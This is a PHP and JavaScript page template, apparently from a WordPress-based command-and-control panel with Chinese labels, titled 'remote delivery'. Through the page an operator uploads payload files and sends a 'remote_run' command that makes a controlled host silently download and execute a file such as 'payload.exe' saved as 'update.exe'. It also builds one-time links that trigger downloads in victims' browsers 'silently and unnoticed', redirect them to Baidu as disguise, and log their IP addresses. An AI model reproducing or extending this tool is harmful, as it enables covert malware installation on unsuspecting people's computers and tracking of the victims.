<?php
defined('ABSPATH') || exit;
include WD_THEME_DIR . '/templates/partials/layout-open.php';
$host_id = (int)($_GET['host_id'] ?? 0);
?>
<div class="wd-wrap">
    <div class="wd-page-header">
        <h1 class="wd-page-title">🚀 远程投递</h1>
        <div class="wd-header-actions">
            <select id="del-host" class="wd-select" title="选择目标主机" aria-label="选择目标主机" onchange="deliveryHostId=parseInt(this.value)||0">
                <option value="">选择主机...</option>
            </select>
        </div>
    </div>

    <div class="wd-card" style="max-width:640px;margin-bottom:16px">
        <div class="wd-card-header" style="display:flex;align-items:center;justify-content:space-between">
            <span>📦 文件库 <span class="wd-text-muted wd-text-sm">（最多 5 个，超出自动删除最旧的）</span></span>
            <label class="wd-btn wd-btn--ghost wd-btn--sm" style="cursor:pointer">
                ↑ 上传文件
                <input type="file" id="lib-input" style="display:none" onchange="libUpload(this)">
            </label>
        </div>
        <div class="wd-card-body wd-p0">
            <div id="lib-list" style="min-height:48px;padding:8px 12px">
                <span class="wd-text-muted wd-text-sm">加载中...</span>
            </div>
        </div>
    </div>

    <div class="wd-card" style="max-width:640px">
        <div class="wd-card-body">
            <p class="wd-text-muted wd-text-sm" style="margin-bottom:16px">
                投递文件链接给目标主机：主机后台静默下载并执行，执行后可跳转到指定网站（如伪装成正常操作）。
            </p>

            <div class="wd-form-row">
                <label class="wd-label">文件下载 URL <span style="color:#f85149">*</span></label>
                <input type="text" id="del-url" class="wd-input" title="文件下载 URL" placeholder="https://example.com/payload.exe">
                <span class="wd-text-muted wd-text-sm">目标主机将从此 URL 下载并执行</span>
            </div>

            <div class="wd-form-row" style="margin-top:14px">
                <label class="wd-label">执行后跳转 URL（可选）</label>
                <input type="text" id="del-redirect" class="wd-input" title="执行后跳转 URL" placeholder="https://baidu.com">
                <span class="wd-text-muted wd-text-sm">留空则不跳转；填写后目标机器浏览器将打开此页面</span>
            </div>

            <div class="wd-form-row" style="margin-top:14px">
                <label class="wd-label">保存文件名（可选）</label>
                <input type="text" id="del-saveas" class="wd-input" title="保存文件名" placeholder="update.exe">
                <span class="wd-text-muted wd-text-sm">留空则从 URL 自动提取</span>
            </div>

            <div style="margin-top:20px;display:flex;gap:10px;align-items:center">
                <button class="wd-btn wd-btn--primary" id="del-btn" onclick="sendDelivery()">🚀 立即投递</button>
                <span id="del-status" class="wd-text-sm"></span>
            </div>
        </div>
    </div>

    <div class="wd-card" style="margin-top:16px;max-width:640px">
        <div class="wd-card-header"><span class="wd-text-sm wd-text-muted">投递日志</span></div>
        <div class="wd-card-body wd-p0">
            <div id="del-log" style="font-family:monospace;font-size:12px;padding:12px;min-height:80px;color:#c9d1d9;max-height:240px;overflow-y:auto"></div>
        </div>
    </div>

    <!-- URL 投递区域，生成一次性链接 -->
    <div style="margin-top:32px">
        <h2 style="font-size:15px;font-weight:600;color:#e6edf3;margin-bottom:16px">🔗 URL 投递</h2>
        <p class="wd-text-muted wd-text-sm" style="margin-bottom:16px">
            生成一个一次性投递链接。目标用户在浏览器中打开该链接后，页面将自动触发程序下载，并在短暂延迟后跳转到指定 URL（如百度），全程静默无感。
        </p>

        <div class="wd-card" style="max-width:640px;margin-bottom:16px">
            <div class="wd-card-header">生成投递链接</div>
            <div class="wd-card-body">
                <div class="wd-form-row">
                    <label class="wd-label">文件 URL <span style="color:#f85149">*</span></label>
                    <div style="display:flex;gap:8px;align-items:center">
                        <input type="text" id="drop-file-url" class="wd-input" title="投递文件 URL" placeholder="从上方文件库选择，或手动填写 https://...">
                        <button class="wd-btn wd-btn--ghost wd-btn--sm" onclick="pickDropFileFromLib()" title="从文件库选择">📂</button>
                    </div>
                </div>
                <div class="wd-form-row" style="margin-top:12px">
                    <label class="wd-label">跳转 URL（可选）</label>
                    <input type="text" id="drop-redirect" class="wd-input" title="跳转 URL" placeholder="https://www.baidu.com">
                    <span class="wd-text-muted wd-text-sm">下载触发后浏览器跳转到此地址，留空默认跳转百度</span>
                </div>
                <div style="display:flex;gap:16px;margin-top:12px">
                    <div style="flex:1">
                        <label class="wd-label">备注标签</label>
                        <input type="text" id="drop-label" class="wd-input" title="备注标签" placeholder="如：办公室PC">
                    </div>
                    <div style="width:110px">
                        <label class="wd-label" for="drop-max-uses">最大使用次数</label>
                        <input type="number" id="drop-max-uses" class="wd-input" title="最大使用次数" value="1" min="1" max="999">
                    </div>
                    <div style="width:130px">
                        <label class="wd-label" for="drop-expire">有效期（小时）</label>
                        <input type="number" id="drop-expire" class="wd-input" title="有效期（小时）" value="72" min="0" placeholder="0=永不">
                    </div>
                </div>
                <div style="margin-top:20px;display:flex;gap:10px;align-items:center">
                    <button class="wd-btn wd-btn--primary" onclick="createDropToken()">⚡ 生成链接</button>
                    <span id="drop-gen-status" class="wd-text-sm"></span>
                </div>
                <div id="drop-result" style="display:none;margin-top:16px;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px">
                    <div style="font-size:12px;color:#7d8590;margin-bottom:6px">投递链接（点击复制）：</div>
                    <div id="drop-url-box" onclick="copyDropUrl(this)" style="font-family:monospace;font-size:13px;color:#58a6ff;cursor:pointer;word-break:break-all;padding:6px 8px;background:#0d1117;border-radius:4px;border:1px solid #21262d" title="点击复制"></div>
                    <div style="font-size:11px;color:#7d8590;margin-top:6px">点击链接文字即可复制到剪贴板</div>
                </div>
            </div>
        </div>

        <div class="wd-card" style="max-width:640px">
            <div class="wd-card-header" style="display:flex;align-items:center;justify-content:space-between">
                <span>已生成的投递链接</span>
                <button class="wd-btn wd-btn--ghost wd-btn--sm" onclick="loadDropTokens()">↻ 刷新</button>
            </div>
            <div class="wd-card-body wd-p0">
                <div id="drop-token-list" style="min-height:60px;padding:8px 0"></div>
            </div>
        </div>
    </div>
</div>

<script>
const INIT_HOST_D = <?= $host_id ?>;
let deliveryHostId = INIT_HOST_D;

async function wd_ajax_d(action, data={}) {
    const fd = new FormData();
    fd.append('action', action);
    fd.append('nonce', (typeof WD !== 'undefined' ? WD.nonce : '') || '');
    Object.entries(data).forEach(([k,v]) => fd.append(k, v));
    const ajaxUrl = (typeof WD !== 'undefined' ? WD.ajax_url : '') || '/wp-admin/admin-ajax.php';
    const r = await fetch(ajaxUrl, {method:'POST', body:fd});
    const text = await r.text();
    try { return JSON.parse(text); } catch(e) { return {success:false, data:{message:'响应解析失败: '+text.slice(0,80)}}; }
}
async function pollDelivery(cmdId, n=0) {
    if(n>30) { setStatus('超时，请检查主机连接','error'); return; }
    const r = await wd_ajax_d('wd_get_cmd_result', {cmd_id:cmdId});
    if(r.success && r.data?.status==='done') {
        addLog('✓ 执行结果: ' + (r.data.result||''));
        setStatus('投递成功！', 'ok');
        return;
    }
    if(r.success && r.data?.status==='error') {
        addLog('✗ 执行失败: ' + (r.data.result||''));
        setStatus('投递失败', 'error');
        return;
    }
    setTimeout(() => pollDelivery(cmdId, n+1), 3000);
}
function setStatus(msg, type) {
    const el = document.getElementById('del-status');
    el.textContent = msg;
    el.style.color = type==='error'?'#f85149':type==='ok'?'#3fb950':'#7d8590';
    document.getElementById('del-btn').disabled = false;
}
function addLog(msg) {
    const el = document.getElementById('del-log');
    const ts = new Date().toLocaleTimeString();
    el.innerHTML += `<div>[${ts}] ${String(msg).replace(/&/g,'&amp;').replace(/</g,'&lt;')}</div>`;
    el.scrollTop = el.scrollHeight;
}
async function sendDelivery() {
    if(!deliveryHostId) { setStatus('请先从顶部下拉框选择目标主机', 'error'); return; }
    const url      = document.getElementById('del-url').value.trim();
    const redirect = document.getElementById('del-redirect').value.trim();
    const saveas   = document.getElementById('del-saveas').value.trim();
    if(!url) { setStatus('请填写文件下载 URL', 'error'); return; }

    document.getElementById('del-btn').disabled = true;
    setStatus('投递中...', '');
    addLog('→ 发送投递指令 url=' + url);

    const payload = JSON.stringify({ url, redirect_url: redirect, save_as: saveas });
    const r = await wd_ajax_d('wd_send_command', {
        host_id: deliveryHostId, cmd_type: 'remote_run', payload
    });
    if(!r.success) { setStatus('指令发送失败: '+(r.data?.message||''), 'error'); addLog('✗ '+JSON.stringify(r.data)); return; }
    addLog('✓ 指令已发送 cmd_id=' + r.data.cmd_id);
    setStatus('等待执行结果...', '');
    pollDelivery(r.data.cmd_id);
}

function fmtBytes(b) { if(!b)return '?'; if(b<1024)return b+'B'; if(b<1048576)return (b/1024).toFixed(1)+'KB'; return (b/1048576).toFixed(1)+'MB'; }
function escH(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/'/g,'&#39;'); }

async function libLoad() {
    const el = document.getElementById('lib-list');
    let r;
    try { r = await wd_ajax_d('wd_delivery_list'); }
    catch(e) { el.innerHTML = '<span style="color:#f85149;font-size:12px">加载失败: '+e.message+'</span>'; return; }
    if(!r.success) { el.innerHTML = '<span style="color:#f85149;font-size:12px">加载失败: '+(r.data?.message||JSON.stringify(r))+'</span>'; return; }
    const files = r.data?.files||[];
    if(!files.length) { el.innerHTML = '<span class="wd-text-muted wd-text-sm">暂无文件，点击右上角上传</span>'; return; }
    el.innerHTML = files.map(f => `
        <div style="display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid #21262d">
            <span style="font-size:18px">📄</span>
            <div style="flex:1;min-width:0">
                <div style="font-size:13px;font-weight:500;color:#c9d1d9;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${escH(f.url)}">${escH(f.name)}</div>
                <div style="font-size:11px;color:#7d8590">${fmtBytes(f.size)} · ${new Date(f.time*1000).toLocaleString()}</div>
            </div>
            <button class="wd-btn wd-btn--ghost wd-btn--sm" data-url="${f.url.replace(/'/g,"&apos;")}" onclick="document.getElementById('del-url').value=this.dataset.url;document.getElementById('drop-file-url').value=this.dataset.url;WD?.toast('URL已填入','success')">使用</button>
            <button class="wd-btn wd-btn--danger wd-btn--sm" onclick="libDel('${f.url.replace(/'/g,"\\'")}')">删</button>
        </div>
    `).join('');
}

async function libUpload(input) {
    if (!input.files.length) return;
    const file = input.files[0];
    input.value = '';
    const ajaxUrl = (typeof WD !== 'undefined' ? WD.ajax_url : '') || '/wp-admin/admin-ajax.php';
    const nonce   = (typeof WD !== 'undefined' ? WD.nonce  : '') || '';

    const CHUNK_SIZE = 1 * 1024 * 1024; // 每块 1 MB，避免 Nginx 上传大小限制
    const totalChunks = Math.max(1, Math.ceil(file.size / CHUNK_SIZE));
    const uid = Date.now().toString(36) + Math.random().toString(36).slice(2);

    const listEl = document.getElementById('lib-list');
    listEl.innerHTML = `<div style="padding:8px 0">
        <div style="font-size:12px;color:#c9d1d9;margin-bottom:4px">上传 ${file.name}（分片上传，共 ${totalChunks} 块）</div>
        <div style="background:#21262d;border-radius:4px;height:6px;overflow:hidden">
            <div id="lib-upload-bar" style="background:#1f6feb;height:100%;width:0%;transition:width .2s"></div>
        </div>
        <div id="lib-upload-label" style="font-size:11px;color:#7d8590;margin-top:4px">准备中...</div>
    </div>`;

    const bar   = document.getElementById('lib-upload-bar');
    const label = document.getElementById('lib-upload-label');

    for (let i = 0; i < totalChunks; i++) {
        const start = i * CHUNK_SIZE;
        const blob  = file.slice(start, start + CHUNK_SIZE);

        const fd = new FormData();
        fd.append('action',       'wd_delivery_upload_chunk');
        fd.append('nonce',        nonce);
        fd.append('uid',          uid);
        fd.append('filename',     file.name);
        fd.append('chunk_idx',    i);
        fd.append('total_chunks', totalChunks);
        fd.append('chunk',        blob, file.name);

        label.textContent = `正在上传 ${i+1} / ${totalChunks} 块...`;
        bar.style.width = Math.round((i / totalChunks) * 100) + '%';

        let r;
        try {
            const resp = await fetch(ajaxUrl, { method: 'POST', body: fd });
            const txt  = await resp.text();
            r = JSON.parse(txt);
        } catch(e) {
            WD?.toast('上传出错: ' + e.message, 'error');
            libLoad(); return;
        }

        if (!r.success) {
            WD?.toast('上传失败: ' + (r.data?.message || JSON.stringify(r.data)), 'error');
            libLoad(); return;
        }

        if (r.data?.done) {
            bar.style.width = '100%';
            label.textContent = '上传完成！';
            setTimeout(libLoad, 800);
            return;
        }
    }
    // 若最后一块返回未完成（理论上不应发生），刷新列表
    libLoad();
}

async function libDel(url) {
    if(!confirm('确认删除此文件？')) return;
    await wd_ajax_d('wd_delivery_delete', {url});
    libLoad();
}

// URL 投递相关，生成一次性投递链接
function pickDropFileFromLib() {
    const files = Array.from(document.querySelectorAll('#lib-list [data-file-url]')).map(el => el.dataset.fileUrl);
    if(!files.length) {
        // 直接从已知文件库条目里读 URL
        const links = document.querySelectorAll('#lib-list button[data-url]');
        const urls = Array.from(links).map(b => b.dataset.url);
        if(!urls.length) { WD?.toast('请先在上方文件库上传文件','error'); return; }
        document.getElementById('drop-file-url').value = urls[0];
        WD?.toast('已填入第一个文件 URL','success');
        return;
    }
    document.getElementById('drop-file-url').value = files[0];
    WD?.toast('已填入文件 URL','success');
}

async function createDropToken() {
    const fileUrl  = document.getElementById('drop-file-url').value.trim();
    const redirect = document.getElementById('drop-redirect').value.trim();
    const label    = document.getElementById('drop-label').value.trim();
    const maxUses  = parseInt(document.getElementById('drop-max-uses').value)||1;
    const expire   = parseInt(document.getElementById('drop-expire').value)||72;
    if(!fileUrl) { WD?.toast('请填写文件 URL','error'); return; }
    const st = document.getElementById('drop-gen-status');
    st.textContent = '生成中...'; st.style.color = '#7d8590';
    const r = await wd_ajax_d('wd_create_drop_token', {file_url:fileUrl, redirect_url:redirect, label, max_uses:maxUses, expire_hours:expire});
    if(!r.success) { st.textContent='失败: '+(r.data?.message||''); st.style.color='#f85149'; return; }
    st.textContent = '已生成'; st.style.color = '#3fb950';
    const box = document.getElementById('drop-url-box');
    box.textContent = r.data.url;
    box.dataset.url = r.data.url;
    document.getElementById('drop-result').style.display = 'block';
    loadDropTokens();
}

function copyDropUrl(el) {
    const url = el.dataset.url || el.textContent;
    navigator.clipboard.writeText(url).then(() => WD?.toast('链接已复制','success'), () => {
        const ta = document.createElement('textarea');
        ta.value = url; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove();
        WD?.toast('链接已复制','success');
    });
}

function escH(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }

async function loadDropTokens() {
    const list = document.getElementById('drop-token-list');
    list.innerHTML = '<div style="padding:12px;color:#7d8590;font-size:12px">加载中...</div>';
    const r = await wd_ajax_d('wd_list_drop_tokens');
    if(!r.success) { list.innerHTML = '<div style="padding:12px;color:#f85149;font-size:12px">加载失败</div>'; return; }
    const tokens = r.data?.tokens||[];
    if(!tokens.length) { list.innerHTML = '<div style="padding:12px;color:#7d8590;font-size:12px">暂无投递链接</div>'; return; }
    list.innerHTML = tokens.map(t => {
        const valid      = t.valid;
        const statusTxt  = valid ? '有效' : (t.expires_at && new Date(t.expires_at)<new Date() ? '已过期' : '已用完');
        const statusColor = valid ? '#3fb950' : '#f85149';
        const fileName   = t.file_url.split('/').pop() || t.file_url;
        const expireStr  = t.expires_at ? new Date(t.expires_at).toLocaleString() : '永不';
        // 访问状态：谁、什么时候、从哪个 IP 来的
        const visited    = !!t.last_visit_at;
        const downloaded = parseInt(t.dl_count||0) > 0;
        const visitInfo  = visited
            ? `<span style="color:#3fb950">✓ 已访问</span> ${new Date(t.last_visit_at).toLocaleString()} · IP: ${escH(t.last_visit_ip||'?')}`
            : `<span style="color:#7d8590">未访问</span>`;
        const dlInfo     = downloaded
            ? `<span style="color:#58a6ff">↓ 下载已触发</span> ${new Date(t.last_dl_at).toLocaleString()} · ${t.dl_count}次`
            : `<span style="color:#7d8590">未触发下载</span>`;
        return `<div style="padding:10px 12px;border-bottom:1px solid #21262d;display:flex;align-items:flex-start;gap:10px">
            <div style="flex:1;min-width:0">
                <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
                    <span style="font-size:13px;font-weight:500;color:#e6edf3">${escH(t.label||'无标签')}</span>
                    <span style="font-size:11px;color:${statusColor};background:${statusColor}22;padding:1px 6px;border-radius:10px">${statusTxt}</span>
                </div>
                <div style="font-size:11px;color:#7d8590;margin-bottom:3px">📄 ${escH(fileName)} · 打开 ${t.uses}/${t.max_uses} 次 · 到期 ${expireStr}</div>
                <div style="font-size:11px;margin-bottom:3px">🌐 ${visitInfo}</div>
                <div style="font-size:11px;margin-bottom:4px">📥 ${dlInfo}</div>
                <div onclick="copyDropUrl(this)" data-url="${escH(t.drop_url)}" style="font-family:monospace;font-size:11px;color:#58a6ff;cursor:pointer;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="点击复制">${escH(t.drop_url)}</div>
            </div>
            <button class="wd-btn wd-btn--danger wd-btn--sm" onclick="deleteDropToken('${escH(t.token)}')">删</button>
        </div>`;
    }).join('');
}

async function deleteDropToken(token) {
    if(!confirm('确认删除此投递链接？')) return;
    await wd_ajax_d('wd_delete_drop_token', {token});
    loadDropTokens();
}

(async function(){
    libLoad();
    loadDropTokens();
    const r = await wd_ajax_d('wd_get_hosts', {per_page:100});
    if(!r.success) return;
    const sel = document.getElementById('del-host');
    (r.data?.items||[]).forEach(h => {
        const o = document.createElement('option');
        o.value = h.id; o.textContent = h.name || h.hostname || ('主机 '+h.id);
        if(h.id == INIT_HOST_D) o.selected = true;
        sel.appendChild(o);
    });
    if(INIT_HOST_D) deliveryHostId = INIT_HOST_D;
})();
</script>

<?php include WD_THEME_DIR . '/templates/partials/layout-close.php'; ?>
